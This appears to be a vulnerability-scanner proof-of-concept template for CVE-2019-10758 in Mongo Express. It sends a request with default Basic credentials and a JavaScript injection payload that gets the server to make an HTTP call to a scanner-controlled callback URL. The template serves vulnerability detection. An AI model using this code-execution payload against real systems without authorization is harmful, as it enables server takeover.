name: poc-yaml-mongo-express-cve-2019-10758
binding: b070013f-c8a7-4924-9cf4-de3fad4494e3
manual: true
detail:
    author: fnmsd(https://github.com/fnmsd)
    links:
        - https://github.com/masahiro331/CVE-2019-10758
        - https://www.twilio.com/blog/2017/08/http-requests-in-node-js.html
    vulnerability:
        id: CT-37527
        level: critical
    description: Mongo Express CVE-2019-10758 Code Execution
    vulnpath: /checkValid
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /checkValid
            headers:
                Authorization: Basic YWRtaW46cGFzcw==
                Content-Type: application/x-www-form-urlencoded
            body: document=this.constructor.constructor('return process')().mainModule.require('http').get('{{reverseURL}}')
            follow_redirects: true
        expression: reverse.wait(5)
expression: r0()
